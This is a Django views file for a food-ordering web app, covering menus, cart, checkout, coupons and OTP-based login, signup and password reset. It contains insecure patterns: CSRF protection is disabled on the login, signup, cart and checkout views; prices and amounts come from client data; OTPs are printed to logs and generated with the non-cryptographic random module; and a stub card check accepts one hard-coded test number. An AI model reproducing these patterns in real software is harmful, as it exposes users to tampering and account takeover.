import time
from food_ordering_project.serializers import serialize_value
import random
import datetime
from django.shortcuts import render, redirect, get_object_or_404
from django.http import JsonResponse, HttpResponse
from django.db import connection, transaction
from django.conf import settings
from django.views.decorators.csrf import csrf_exempt
from django.core.mail import send_mail
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas
import bcrypt

from .models import (
    Category, Food, Restro, RestroFoodItem, User,
    OrderManager, Coupon, FestivalCoupon, Review, ReviewRestro, ContactMessage, Aamarpay
)

# Helper to get the logged-in customer user
def get_customer_user(request):
    username = request.session.get('user')
    if username:
        # Querying tbl_users
        return User.objects.filter(username=username).first()
    return None

# Helper to get session user details for any portal type
def get_session_user_meta(request):
    user = get_customer_user(request)
    if user:
        return user.username, user.name, user.user_role
    elif 'user-admin' in request.session:
        admin_user = request.session.get('user-admin')
        return admin_user, admin_user, 1
    elif 'restro-name' in request.session:
        restro_user = request.session.get('restro-name')
        return restro_user, restro_user, 2
    elif 'delivery-boy' in request.session:
        delivery_user = request.session.get('delivery-boy')
        return delivery_user, delivery_user, 3
    return None, None, None

# Helper to check if a user is blocked
def is_user_blocked(request):
    user = get_customer_user(request)
    if user and user.user_role == 0:
        # Clear session if blocked
        request.session.flush()
        return True
    return False

# Index Landing Page
def index(request):
    if is_user_blocked(request):
        if request.headers.get('X-React-App') == 'true':
            return JsonResponse({'status': 'redirect', 'redirect': '/login/'})
        return redirect('login')
    
    # 1. Fetch categories
    categories = Category.objects.filter(active='Yes')
    # Featured categories first
    categories = sorted(categories, key=lambda c: (0 if c.featured == 'Yes' else 1, -c.id))[:6]
    
    # 2. Featured Foods
    featured_foods = Food.objects.filter(active='Yes', featured='Yes', stock__gt=0)[:6]
    
    # 3. Approved Restaurants
    restaurants = Restro.objects.filter(status='approved').order_by('-id')[:4]
    
    # Return JSON for React frontend
    if request.headers.get('X-React-App') == 'true' or request.GET.get('format') == 'json':
        username, name, role = get_session_user_meta(request)
        cart_items = request.session.get('cart', [])
        return JsonResponse({
            'categories': serialize_value(list(categories)),
            'featured_foods': serialize_value(list(featured_foods)),
            'restaurants': serialize_value(list(restaurants)),
            'user': username,
            'name': name,
            'role': role,
            'cart_items': cart_items,
            'cart_count': len(cart_items),
        })
    
    context = {
        'categories': categories,
        'featured_foods': featured_foods,
        'restaurants': restaurants,
        'cart_count': len(request.session.get('cart', [])),
        'is_home': True,
    }
    return render(request, 'frontend/index.html', context)

# About Page
def about(request):
    context = {
        'cart_count': len(request.session.get('cart', [])),
        'is_about': True,
        'current_title': 'About Us',
    }
    return render(request, 'frontend/about.html', context)

# Team Page
def team(request):
    context = {
        'cart_count': len(request.session.get('cart', [])),
        'is_pages': True,
        'current_title': 'Our Team',
    }
    return render(request, 'frontend/team.html', context)

# Testimonial Page
def testimonial(request):
    context = {
        'cart_count': len(request.session.get('cart', [])),
        'is_pages': True,
        'current_title': 'Testimonials',
    }
    return render(request, 'frontend/testimonial.html', context)


# Categories List
def categories(request):
    categories_list = Category.objects.filter(active='Yes').order_by('-id')
    
    # Return JSON for React frontend
    if request.headers.get('X-React-App') == 'true':
        return JsonResponse({
            'categories': serialize_value(list(categories_list)),
        })
    
    context = {
        'categories': categories_list,
        'cart_count': len(request.session.get('cart', [])),
        'is_categories': True,
        'current_title': 'Categories',
    }
    return render(request, 'frontend/categories.html', context)

# Category Foods Grid
def category_foods(request, category_id):
    category = get_object_or_404(Category, id=category_id)
    foods = Food.objects.filter(category_id=category_id, active='Yes', stock__gt=0).order_by('-id')
    
    # Return JSON for React frontend
    if request.headers.get('X-React-App') == 'true':
        return JsonResponse({
            'category': serialize_value(category),
            'foods': serialize_value(list(foods)),
        })
    
    context = {
        'category': category,
        'foods': foods,
        'cart_count': len(request.session.get('cart', [])),
        'is_categories': True,
        'current_title': f'Category: {category.title}',
    }
    return render(request, 'frontend/category-foods.html', context)

# Full Menu / Search Catalog
def menu(request):
    search_query = request.GET.get('search', '').strip()
    if search_query:
        foods = Food.objects.filter(
            active='Yes',
            stock__gt=0,
            title__icontains=search_query
        ).order_by('-id')
    else:
        foods = Food.objects.filter(active='Yes', stock__gt=0).order_by('-id')
    
    # Return JSON for React frontend
    if request.headers.get('X-React-App') == 'true' or request.GET.get('format') == 'json':
        username, name, role = get_session_user_meta(request)
        cart_items = request.session.get('cart', [])
        return JsonResponse({
            'foods': serialize_value(list(foods)),
            'search_query': search_query,
            'user': username,
            'name': name,
            'role': role,
            'cart_items': cart_items,
            'cart_count': len(cart_items),
        })
        
    context = {
        'foods': foods,
        'search_query': search_query,
        'cart_count': len(request.session.get('cart', [])),
        'is_menu': True,
        'current_title': 'Food Menu',
    }
    return render(request, 'frontend/menu.html', context)

# Approved Restaurants List
def restaurant(request):
    restaurants = Restro.objects.filter(status='approved').order_by('-id')
    
    # Return JSON for React frontend
    if request.headers.get('X-React-App') == 'true':
        return JsonResponse({
            'restaurants': serialize_value(list(restaurants)),
        })
    
    context = {
        'restaurants': restaurants,
        'cart_count': len(request.session.get('cart', [])),
        'is_restro': True,
        'current_title': 'Restaurants',
    }
    return render(request, 'frontend/restaurant.html', context)

# Restaurant Specific Categories
def restro_category(request, category_id):
    # Select category approved
    with connection.cursor() as cursor:
        cursor.execute("SELECT title, cid FROM tbl_rcategory_notapproved WHERE cid=%s AND status='approved'", [category_id])
        cat_row = cursor.fetchone()
    
    if not cat_row:
        if request.headers.get('X-React-App') == 'true':
            return JsonResponse({'error': 'Category not found or not approved.'}, status=404)
        return render(request, 'frontend/restro-category.html', {
            'error': 'Category not found or not approved.',
            'cart_count': len(request.session.get('cart', [])),
        })
        
    foods = RestroFoodItem.objects.filter(cid=category_id, stock__gt=0, status='approved')
    
    # Return JSON for React frontend
    if request.headers.get('X-React-App') == 'true':
        return JsonResponse({
            'category_title': cat_row[0],
            'category_id': cat_row[1],
            'foods': serialize_value(list(foods)),
        })
    
    context = {
        'category_title': cat_row[0],
        'category_id': cat_row[1],
        'foods': foods,
        'cart_count': len(request.session.get('cart', [])),
        'is_restro': True,
        'current_title': f'Restaurant Category: {cat_row[0]}',
    }
    return render(request, 'frontend/restro-category.html', context)

# Restaurant Specific Menu
def restro_menu(request, restro_name):
    foods = RestroFoodItem.objects.filter(restro_name=restro_name, active='Yes', status='approved', stock__gt=0).order_by('-id')
    
    # Return JSON for React frontend
    if request.headers.get('X-React-App') == 'true':
        return JsonResponse({
            'restro_name': restro_name,
            'foods': serialize_value(list(foods)),
        })
    
    context = {
        'restro_name': restro_name,
        'foods': foods,
        'cart_count': len(request.session.get('cart', [])),
        'is_restro': True,
        'current_title': f'{restro_name} Menu',
    }
    return render(request, 'frontend/restro-menu.html', context)

# Add to Cart View (redirect back or handle AJAX)
def add_to_cart(request):
    food_id = request.GET.get('food_id')
    if not food_id:
        return redirect('menu')
        
    food_id = int(food_id)
    item = None
    
    # 1. Search in tbl_food
    food = Food.objects.filter(id=food_id).first()
    if food:
        item = {
            'Item_Name': food.title,
            'Price': float(food.price),
            'Id': food.id,
            'Restro_Name': food.restro_name,
            'Quantity': 1
        }
    else:
        # 2. Search in tbl_restro_food_item
        restro_food = RestroFoodItem.objects.filter(id=food_id).first()
        if restro_food:
            item = {
                'Item_Name': restro_food.title,
                'Price': float(restro_food.price),
                'Id': restro_food.id,
                'Restro_Name': restro_food.restro_name,
                'Quantity': 1
            }
            
    if not item:
        context = {'statusMessage': 'Unable to add item. Please try again.', 'statusClass': 'text-danger'}
        return render(request, 'frontend/add-to-cart.html', context)
        
    cart = request.session.get('cart', [])
    existing_item = next((i for i in cart if i['Item_Name'] == item['Item_Name']), None)
    
    if existing_item:
        statusMessage = 'Item Already In Cart'
        statusClass = 'text-warning'
    else:
        cart.append(item)
        request.session['cart'] = cart
        request.session.modified = True
        statusMessage = 'Item Added to Cart!'
        statusClass = 'text-success'
        
    context = {
        'statusMessage': statusMessage,
        'statusClass': statusClass,
        'cart_count': len(request.session.get('cart', [])),
        'is_menu': True,
        'current_title': 'Add To Cart',
    }
    return render(request, 'frontend/add-to-cart.html', context)

# Cart Operations API/Post Handler
@csrf_exempt
def manage_cart(request):
    if request.method != 'POST':
        if request.headers.get('X-React-App') == 'true':
            return JsonResponse({'status': 'redirect', 'redirect': '/mycart/'})
        return redirect('mycart')
        
    action_add = 'Add_To_Cart' in request.POST
    action_remove = 'Remove_Item' in request.POST
    action_qty = 'Mod_Quantity' in request.POST
    is_ajax = request.POST.get('ajax') == '1' or request.headers.get('X-React-App') == 'true' or request.GET.get('format') == 'json'
    
    cart = request.session.get('cart', [])
    
    if action_add:
        item_name = request.POST.get('Item_Name')
        price = float(request.POST.get('Price', 0))
        item_id = int(request.POST.get('Id', 0))
        restro_name = request.POST.get('Restro_Name', 'Pasar Kita')
        
        existing_item = next((i for i in cart if i['Item_Name'] == item_name), None)
        if existing_item:
            if is_ajax:
                return JsonResponse({'status': 'info', 'message': 'Item Already In Cart'})
        else:
            cart.append({
                'Item_Name': item_name,
                'Price': price,
                'Id': item_id,
                'Restro_Name': restro_name,
                'Quantity': 1
            })
            request.session['cart'] = cart
            request.session.modified = True
            if is_ajax:
                return JsonResponse({'status': 'success', 'message': 'Item added to cart successfully!'})
                
    elif action_remove:
        item_name = request.POST.get('Item_Name')
        cart = [i for i in cart if i['Item_Name'] != item_name]
        request.session['cart'] = cart
        request.session.modified = True
        if is_ajax:
            return JsonResponse({'status': 'success', 'message': 'Item removed from cart successfully!'})
        
    elif action_qty:
        item_name = request.POST.get('Item_Name')
        new_qty = int(request.POST.get('Mod_Quantity', 1))
        for i in cart:
            if i['Item_Name'] == item_name:
                i['Quantity'] = max(1, min(20, new_qty))
                break
        request.session['cart'] = cart
        request.session.modified = True
        if is_ajax:
            return JsonResponse({'status': 'success', 'message': 'Quantity updated successfully!'})
        
    return redirect('mycart')

# Cart page and checkout submission
@csrf_exempt
def mycart(request):
    if is_user_blocked(request):
        return redirect('login')
        
    is_react = request.headers.get('X-React-App') == 'true' or request.GET.get('format') == 'json'
    cart_items = request.session.get('cart', [])
    coupon_message = ''
    coupon_class = ''
    discount = 0
    base_total = sum(float(item['Price']) * int(item['Quantity']) for item in cart_items)
    total_amount = base_total
    
    # Apply coupon
    if request.method == 'POST' and 'apply_coupon' in request.POST:
        coupon_code = request.POST.get('coupon_code', '').strip()
        if not coupon_code:
            coupon_message = 'Please enter a coupon code.'
            coupon_class = 'text-danger'
        else:
            # Query coupon
            coupon = Coupon.objects.filter(coupon_code=coupon_code, status='active').first()
            discount_val = 0
            if coupon:
                discount_val = float(coupon.discount)
            else:
                # Query festival coupon
                fest = FestivalCoupon.objects.filter(coupon_code=coupon_code, status='active', expire='active').first()
                if fest:
                    discount_val = float(fest.discount)
            
            if discount_val > 0:
                discount = discount_val
                total_amount = max(0.0, base_total - (base_total * (discount / 100)))
                coupon_message = f'Coupon applied: {discount}% OFF'
                coupon_class = 'text-success'
            else:
                coupon_message = 'Invalid or expired coupon code.'
                coupon_class = 'text-danger'
                
    # Place order logic
    user = get_customer_user(request)
    if request.method == 'POST' and 'purchase' in request.POST:
        if not user:
            return redirect('login')
            
        pay_mode = request.POST.get('pay_mode')
        amount = float(request.POST.get('amount', 0))
        tran_id = request.POST.get('tran_id', '')
        cus_name = request.POST.get('cus_name', '')
        cus_email = request.POST.get('cus_email', '')
        cus_add1 = request.POST.get('cus_add1', '')
        cus_city = request.POST.get('cus_city', '')
        cus_phone = int(request.POST.get('cus_phone', 0))
        location = request.POST.get('location', '')
        order_date = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        payment_status = 'cod'
        
        if pay_mode == 'card':
            card_number = request.POST.get('card_number')
            card_expiry = request.POST.get('card_expiry')
            card_cvv = request.POST.get('card_cvv')
            
            if card_number == '1234567890123456' and card_expiry == '12/25' and card_cvv == '123':
                payment_status = 'successful'
            else:
                if is_react:
                    return JsonResponse({'status': 'error', 'message': 'Payment failed. Please check card details.'}, status=400)
                context = {
                    'error_msg': 'Payment failed. Please check card details.',
                    'cart_items': cart_items,
                    'is_logged_in': True,
                    'username': user.username,
                    'cus_name': cus_name,
                    'cus_email': cus_email,
                    'cus_add1': cus_add1,
                    'cus_city': cus_city,
                    'cus_phone': cus_phone,
                    'base_total': base_total,
                    'total_amount': base_total,
                    'google_maps_api_key': settings.GOOGLE_MAPS_API_KEY,
                }
                return render(request, 'frontend/mycart.html', context)
        elif pay_mode == 'upi':
            payment_status = 'pending_upi'
            tran_id = f'UPI-PENDING-{random.randint(100000, 999999)}'
            
        # Write to OrderManager
        with transaction.atomic():
            # Standard ORM query for OrderManager
            order = OrderManager.objects.create(
                username=user.username,
                cus_name=cus_name,
                cus_email=cus_email,
                cus_add1=cus_add1,
                cus_city=cus_city,
                cus_phone=cus_phone,
                payment_status=payment_status,
                order_date=order_date,
                total_amount=int(amount),
                transaction_id=tran_id,
                order_status='Pending',
                location=location
            )
            order_id = order.order_id
            
            # Write to Aamarpay
            card_type = 'upi' if pay_mode == 'upi' else 'card'
            with connection.cursor() as cursor:
                cursor.execute(
                    "INSERT INTO aamarpay (order_id, cus_name, amount, status, transaction_id, card_type) VALUES (%s, %s, %s, %s, %s, %s)",
                    [order_id, cus_name, amount, payment_status, tran_id, card_type]
                )
                
            # Write to online_orders_new (no primary key, using raw SQL)
            for cart_item in cart_items:
                line_total = float(cart_item['Price']) * int(cart_item['Quantity'])
                with connection.cursor() as cursor:
                    cursor.execute(
                        "INSERT INTO online_orders_new (order_id, Item_Name, Price, Quantity, total_amount, restro_name) VALUES (%s, %s, %s, %s, %s, %s)",
                        [order_id, cart_item['Item_Name'], cart_item['Price'], cart_item['Quantity'], line_total, cart_item['Restro_Name']]
                    )
                    
        if pay_mode == 'upi':
            if is_react:
                return JsonResponse({'status': 'redirect', 'redirect': f'/pg/checkout/?order_id={order_id}&amount={amount}'})
            return redirect(f'/pg/checkout/?order_id={order_id}&amount={amount}')
        else:
            # Deduct stock
            for cart_item in cart_items:
                qty = int(cart_item['Quantity'])
                name = cart_item['Item_Name']
                # Deduct in tbl_food
                with connection.cursor() as cursor:
                    cursor.execute("UPDATE tbl_food SET stock = stock - %s WHERE title = %s", [qty, name])
                    cursor.execute("UPDATE tbl_restro_food_item SET stock = stock - %s WHERE title = %s", [qty, name])
                    
            # Clear cart
            request.session['cart'] = []
            request.session.modified = True
            if is_react:
                return JsonResponse({'status': 'success', 'order_id': order_id})
            return render(request, 'frontend/order-success.html', {'order_id': order_id})
            
    context = {
        'cart_items': cart_items,
        'is_cart_empty': len(cart_items) == 0,
        'base_total': base_total,
        'total_amount': total_amount,
        'coupon_message': coupon_message,
        'coupon_class': coupon_class,
        'discount': discount,
        'is_logged_in': user is not None,
        'username': user.username if user else '',
        'cus_name': user.name if user else '',
        'cus_email': user.email if user else '',
        'cus_add1': user.add1 if user else '',
        'cus_city': user.city if user else '',
        'cus_phone': user.phone if user else '',
        'google_maps_api_key': settings.GOOGLE_MAPS_API_KEY,
        'cart_count': len(cart_items),
        'is_menu': True,
        'current_title': 'My Cart',
    }
    if is_react:
        return JsonResponse(context)
    return render(request, 'frontend/mycart.html', context)

# User Login
@csrf_exempt
def login_view(request):
    if request.session.get('user'):
        return redirect('index')
        
    is_react = request.headers.get('X-React-App') == 'true' or request.GET.get('format') == 'json'
    message = ''
    message_class = 'error'
    username = ''
    otp_step = False
    
    flash_success = request.session.pop('auth-flash-success', '')
    
    if request.method == 'POST':
        if 'send_login_otp' in request.POST:
            username = request.POST.get('username', '').strip()
            password = request.POST.get('password', '')
            
            user = User.objects.filter(username=username).first()
            if not user:
                message = 'No account found with this username.'
            elif user.user_role == 0:
                message = 'Your account has been blocked by the admin.'
            else:
                # BCrypt checkpw
                hashed = user.password
                if hashed.startswith('$2y$'):
                    hashed = hashed.replace('$2y$', '$2a$', 1)
                if bcrypt.checkpw(password.encode('utf-8'), hashed.encode('utf-8')):
                    # Generate OTP
                    otp = str(random.randint(100000, 999999))
                    # Save login credentials in temporary session variables
                    request.session['login_pending_user'] = {
                        'username': user.username,
                        'name': user.name,
                    }
                    request.session['login_pending_otp'] = otp
                    request.session['login_pending_otp_expires_at'] = int(time.time()) + 60
                    request.session['login_pending_email'] = user.email
                    request.session['login_pending_username'] = user.username
                    
                    # Send Email OTP
                    email_body = f"Confirm your login with this OTP: {otp}\n\nExpires in 60 seconds."
                    print(f"\n========================================\n[DEV] LOGIN OTP FOR {user.email}: {otp}\n========================================\n")
                    email_sent = False
                    email_error = None
                    try:
                        send_mail(
                            'Pasar-kita Login OTP',
                            email_body,
                            settings.DEFAULT_FROM_EMAIL,
                            [user.email],
                            fail_silently=False
                        )
                        email_sent = True
                    except Exception as e:
                        import traceback
                        traceback.print_exc()
                        email_sent = False
                        email_error = str(e)
                    
                    if email_sent:
                        otp_step = True
                        message = 'Login OTP sent to your registered email. It expires in 60 seconds.'
                        message_class = 'success'
                    else:
                        otp_step = False
                        message = f'Failed to send OTP email: {email_error}. Please try again later or check your SMTP settings.'
                        message_class = 'danger'
                else:
                    message = 'Invalid password. Please try again.'
                    
        elif 'resend_login_otp' in request.POST:
            pending_user = request.session.get('login_pending_user')
            pending_email = request.session.get('login_pending_email')
            if not pending_user or not pending_email:
                message = 'Login session expired. Please enter credentials again.'
            else:
                otp = str(random.randint(100000, 999999))
                request.session['login_pending_otp'] = otp
                request.session['login_pending_otp_expires_at'] = int(time.time()) + 60
                
                email_body = f"Confirm your login with this OTP: {otp}\n\nExpires in 60 seconds."
                print(f"\n========================================\n[DEV] LOGIN OTP FOR {pending_email}: {otp}\n========================================\n")
                email_sent = False
                email_error = None
                try:
                    send_mail(
                        'Pasar-kita Login OTP',
                        email_body,
                        settings.DEFAULT_FROM_EMAIL,
                        [pending_email],
                        fail_silently=False
                    )
                    email_sent = True
                except Exception as e:
                    import traceback
                    traceback.print_exc()
                    email_sent = False
                    email_error = str(e)
                
                if email_sent:
                    otp_step = True
                    message = 'A new login OTP has been sent. It expires in 60 seconds.'
                    message_class = 'success'
                else:
                    otp_step = True  # Stay on the OTP input step
                    message = f'Failed to send login OTP: {email_error}. Please try again.'
                    message_class = 'danger'
                username = request.session.get('login_pending_username', '')
                
        elif 'verify_login_otp' in request.POST:
            otp_step = True
            otp_input = request.POST.get('login_otp', '').strip()
            
            pending_user = request.session.get('login_pending_user')
            saved_otp = request.session.get('login_pending_otp')
            expires_at = int(request.session.get('login_pending_otp_expires_at', 0))
            username = request.session.get('login_pending_username', '')
            
            if not pending_user or not saved_otp:
                message = 'Login session expired. Please enter credentials again.'
                otp_step = False
            elif time.time() > expires_at:
                message = 'Login OTP expired. Click resend to get a new code.'
            elif otp_input != saved_otp:
                message = 'OTP does not match.'
            else:
                # Login Success!
                request.session['user'] = pending_user['username']
                request.session['name'] = pending_user['name']
                # Clear pending vars
                for key in ['login_pending_user', 'login_pending_otp', 'login_pending_otp_expires_at', 'login_pending_email', 'login_pending_username']:
                    request.session.pop(key, None)
                return redirect('index')
                
    otp_expires_at = int(request.session.get('login_pending_otp_expires_at', 0))
    context = {
        'message': message,
        'message_class': message_class,
        'username': username,
        'otp_step': otp_step,
        'otp_email': request.session.get('login_pending_email', ''),
        'otp_expires_at': otp_expires_at,
        'flash_success': flash_success,
    }
    if is_react:
        return JsonResponse(context)
    return render(request, 'frontend/login.html', context)

# User Signup
@csrf_exempt
def signup_view(request):
    if request.session.get('user'):
        return redirect('index')
        
    is_react = request.headers.get('X-React-App') == 'true' or request.GET.get('format') == 'json'
    message = ''
    message_class = 'error'
    values = {
        'name': '',
        'username': '',
        'email': '',
        'phone': '',
        'city': '',
        'address': '',
    }
    otp_step = False
    
    if request.method == 'POST':
        if 'send_signup_otp' in request.POST:
            values = {
                'name': request.POST.get('name', '').strip(),
                'username': request.POST.get('username', '').strip(),
                'email': request.POST.get('email', '').strip(),
                'phone': request.POST.get('phone', '').strip(),
                'city': request.POST.get('city', '').strip(),
                'address': request.POST.get('address', '').strip(),
            }
            password = request.POST.get('password', '')
            confirm_password = request.POST.get('confirm_password', '')
            
            # Server Validation
            if any(not v for v in values.values()) or not password or not confirm_password:
                message = 'Please fill in all fields.'
            elif password != confirm_password:
                message = 'Password and confirm password do not match.'
            elif User.objects.filter(username=values['username']).exists() or User.objects.filter(email=values['email']).exists():
                message = 'Username or email already exists.'
            else:
                # Generate Signup OTP
                otp = str(random.randint(100000, 999999))
                # Hash Password
                hashed = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt(10)).decode('utf-8')
                # Modify Bcrypt variant prefix if needed
                hashed = hashed.replace('$2b$', '$2y$', 1)
                
                request.session['signup_pending_data'] = {
                    'name': values['name'],
                    'username': values['username'],
                    'email': values['email'],
                    'phone': values['phone'],
                    'city': values['city'],
                    'address': values['address'],
                    'password_hash': hashed,
                }
                request.session['signup_pending_otp'] = otp
                request.session['signup_pending_otp_expires_at'] = int(time.time()) + 60
                
                # Send Email OTP
                email_body = f"Confirm your signup with this OTP: {otp}\n\nExpires in 60 seconds."
                print(f"\n========================================\n[DEV] SIGNUP OTP FOR {values['email']}: {otp}\n========================================\n")
                email_sent = False
                email_error = None
                try:
                    send_mail(
                        'Pasar-kita Signup OTP',
                        email_body,
                        settings.DEFAULT_FROM_EMAIL,
                        [values['email']],
                        fail_silently=False
                    )
                    email_sent = True
                except Exception as e:
                    import traceback
                    traceback.print_exc()
                    email_sent = False
                    email_error = str(e)
                
                if email_sent:
                    otp_step = True
                    message = 'Signup OTP sent to your email. Verify it within 60 seconds.'
                    message_class = 'success'
                else:
                    otp_step = False
                    message = f'Failed to send OTP email: {email_error}. Please try again later or check your SMTP settings.'
                    message_class = 'danger'
                
        elif 'resend_signup_otp' in request.POST:
            pending_data = request.session.get('signup_pending_data')
            if not pending_data:
                message = 'Signup session expired. Please fill the form again.'
            else:
                otp = str(random.randint(100000, 999999))
                request.session['signup_pending_otp'] = otp
                request.session['signup_pending_otp_expires_at'] = int(time.time()) + 60
                
                email_body = f"Confirm your signup with this OTP: {otp}\n\nExpires in 60 seconds."
                print(f"\n========================================\n[DEV] SIGNUP OTP FOR {pending_data['email']}: {otp}\n========================================\n")
                email_sent = False
                email_error = None
                try:
                    send_mail(
                        'Pasar-kita Signup OTP',
                        email_body,
                        settings.DEFAULT_FROM_EMAIL,
                        [pending_data['email']],
                        fail_silently=False
                    )
                    email_sent = True
                except Exception as e:
                    import traceback
                    traceback.print_exc()
                    email_sent = False
                    email_error = str(e)
                
                if email_sent:
                    otp_step = True
                    message = 'A new signup OTP has been sent. It expires in 60 seconds.'
                    message_class = 'success'
                else:
                    otp_step = True  # Stay on the OTP input step
                    message = f'Failed to send signup OTP: {email_error}. Please try again.'
                    message_class = 'danger'
                values = pending_data
                
        elif 'verify_signup_otp' in request.POST:
            otp_step = True
            otp_input = request.POST.get('signup_otp', '').strip()
            
            pending_data = request.session.get('signup_pending_data')
            saved_otp = request.session.get('signup_pending_otp')
            expires_at = int(request.session.get('signup_pending_otp_expires_at', 0))
            
            if not pending_data or not saved_otp:
                message = 'Signup session expired. Please fill the form again.'
                otp_step = False
            elif time.time() > expires_at:
                message = 'Signup OTP expired. Click resend to get a new code.'
            elif otp_input != saved_otp:
                message = 'OTP does not match.'
            else:
                # Create user using raw SQL to bypass managed=False constraint if needed, but since it has auto-increment id, we can also use ORM save! Let's use raw SQL/ORM. ORM is fine.
                with transaction.atomic():
                    # Insert in database
                    with connection.cursor() as cursor:
                        cursor.execute(
                            "INSERT INTO tbl_users (name, username, email, password, phone, add1, city) VALUES (%s, %s, %s, %s, %s, %s, %s)",
                            [pending_data['name'], pending_data['username'], pending_data['email'], pending_data['password_hash'], pending_data['phone'], pending_data['address'], pending_data['city']]
                        )
                # Clear session signup state
                for key in ['signup_pending_data', 'signup_pending_otp', 'signup_pending_otp_expires_at']:
                    request.session.pop(key, None)
                request.session['auth-flash-success'] = 'Signup complete. OTP verified. You can log in now.'
                return redirect('login')
                
    if request.GET.get('restart') == '1':
        for key in ['signup_pending_data', 'signup_pending_otp', 'signup_pending_otp_expires_at']:
            request.session.pop(key, None)
        return redirect('signup')
        
    otp_expires_at = int(request.session.get('signup_pending_otp_expires_at', 0))
    context = {
        'message': message,
        'message_class': message_class,
        'values': values,
        'otp_step': otp_step,
        'otp_email': request.session.get('signup_pending_data', {}).get('email', ''),
        'otp_expires_at': otp_expires_at,
    }
    if is_react:
        return JsonResponse(context)
    return render(request, 'frontend/signup.html', context)

# User Forgot Password Reset
@csrf_exempt
def forget_view(request):
    if request.session.get('user'):
        return redirect('index')
        
    is_react = request.headers.get('X-React-App') == 'true' or request.GET.get('format') == 'json'
    message = ''
    show_reset_key = False
    show_password = False
    
    if request.method == 'POST':
        if 'verify_email' in request.POST:
            email = request.POST.get('email', '').strip()
            if not email:
                message = "<div class='alert-box error-box'>Email is required.</div>"
            else:
                user = User.objects.filter(email=email).first()
                if not user:
                    message = "<div class='alert-box error-box'>Email not found.</div>"
                else:
                    otp = str(random.randint(100000, 999999))
                    # Update reset_key in tbl_users
                    with connection.cursor() as cursor:
                        cursor.execute("UPDATE tbl_users SET reset_key = %s WHERE email = %s", [otp, email])
                        
                    # Send OTP email
                    email_body = f"Use the reset OTP to recover your password: {otp}\n\nExpires in 60 seconds."
                    print(f"\n========================================\n[DEV] PASSWORD RESET OTP FOR {email}: {otp}\n========================================\n")
                    email_sent = False
                    email_error = None
                    try:
                        send_mail(
                            'Pasar-kita Password Reset OTP',
                            email_body,
                            settings.DEFAULT_FROM_EMAIL,
                            [email],
                            fail_silently=False
                        )
                        email_sent = True
                    except Exception as e:
                        import traceback
                        traceback.print_exc()
                        email_sent = False
                        email_error = str(e)
                    
                    if email_sent:
                        request.session['verified_email'] = email
                        request.session['reset_key'] = otp
                        request.session['reset_key_expires_at'] = int(time.time()) + 60
                        request.session.pop('reset_verified', None)
                        message = f"<div class='alert-box success-box'>Reset key sent to your registered email. It expires in 60 seconds.</div>"
                    else:
                        message = f"<div class='alert-box error-box'>Failed to send OTP email: {email_error}. Please try again later or check your SMTP settings.</div>"
                    
        elif 'resend_reset_key' in request.POST:
            email = request.session.get('verified_email')
            if not email:
                message = "<div class='alert-box error-box'>Reset session expired. Please verify your email again.</div>"
            else:
                otp = str(random.randint(100000, 999999))
                with connection.cursor() as cursor:
                    cursor.execute("UPDATE tbl_users SET reset_key = %s WHERE email = %s", [otp, email])
                    
                email_body = f"Use the reset OTP to recover your password: {otp}\n\nExpires in 60 seconds."
                print(f"\n========================================\n[DEV] PASSWORD RESET OTP FOR {email}: {otp}\n========================================\n")
                email_sent = False
                email_error = None
                try:
                    send_mail(
                        'Pasar-kita Password Reset OTP',
                        email_body,
                        settings.DEFAULT_FROM_EMAIL,
                        [email],
                        fail_silently=False
                    )
                    email_sent = True
                except Exception as e:
                    import traceback
                    traceback.print_exc()
                    email_sent = False
                    email_error = str(e)
                
                if email_sent:
                    request.session['reset_key'] = otp
                    request.session['reset_key_expires_at'] = int(time.time()) + 60
                    message = f"<div class='alert-box success-box'>A new reset key has been sent. It expires in 60 seconds.</div>"
                else:
                    message = f"<div class='alert-box error-box'>Failed to send reset key: {email_error}. Please try again.</div>"
                
        elif 'verify_reset_key' in request.POST:
            reset_key_input = request.POST.get('reset_key', '').strip()
            saved_key = request.session.get('reset_key')
            expires_at = int(request.session.get('reset_key_expires_at', 0))
            
            if not saved_key:
                message = "<div class='alert-box error-box'>Session expired. Please verify email again.</div>"
            elif time.time() > expires_at:
                message = "<div class='alert-box error-box'>Reset key expired. Click resend to get a new code.</div>"
            elif reset_key_input != saved_key:
                message = "<div class='alert-box error-box'>Reset key does not match.</div>"
            else:
                request.session['reset_verified'] = True
                request.session.pop('reset_key', None)
                request.session.pop('reset_key_expires_at', None)
                message = "<div class='alert-box success-box'>Reset key verified. Set your new password.</div>"
                
        elif 'update_password' in request.POST:
            new_password = request.POST.get('new_password', '')
            confirm_password = request.POST.get('confirm_password', '')
            email = request.session.get('verified_email')
            
            if not new_password or not confirm_password:
                message = "<div class='alert-box error-box'>Both password fields are required.</div>"
            elif new_password != confirm_password:
                message = "<div class='alert-box error-box'>Passwords do not match.</div>"
            elif not request.session.get('reset_verified'):
                message = "<div class='alert-box error-box'>Please verify reset key first.</div>"
            else:
                hashed = bcrypt.hashpw(new_password.encode('utf-8'), bcrypt.gensalt(10)).decode('utf-8')
                hashed = hashed.replace('$2b$', '$2y$', 1)
                
                with connection.cursor() as cursor:
                    cursor.execute("UPDATE tbl_users SET password = %s, reset_key = NULL WHERE email = %s", [hashed, email])
                
                message = "<div class='alert-box success-box'>Password updated successfully. <a href='/login.php'>Log in</a>.</div>"
                # Clear reset states
                for key in ['verified_email', 'reset_key', 'reset_key_expires_at', 'reset_verified']:
                    request.session.pop(key, None)
                    
    if request.GET.get('restart') == '1':
        for key in ['verified_email', 'reset_key', 'reset_key_expires_at', 'reset_verified']:
            request.session.pop(key, None)
        return redirect('forget')
        
    show_password = request.session.get('reset_verified', False) == True
    show_reset_key = not show_password and 'verified_email' in request.session
    reset_expires_at = int(request.session.get('reset_key_expires_at', 0))
    
    context = {
        'message': message,
        'show_reset_key': show_reset_key,
        'show_password': show_password,
        'reset_expires_at': reset_expires_at,
    }
    if is_react:
        return JsonResponse(context)
    return render(request, 'frontend/forget.html', context)

# User Logout
def logout_view(request):
    request.session.flush()
    return redirect('index')

# User Account Profile Details
def myaccount(request):
    user = get_customer_user(request)
    if not user:
        return redirect('login')
    if is_user_blocked(request):
        return redirect('login')
        
    context = {
        'user': user,
        'cart_count': len(request.session.get('cart', [])),
        'is_pages': True,
        'current_title': 'My Account',
    }
    return render(request, 'frontend/myaccount.html', context)

# Update Account Details
def update_account(request):
    user = get_customer_user(request)
    if not user:
        return redirect('login')
    if is_user_blocked(request):
        return redirect('login')
        
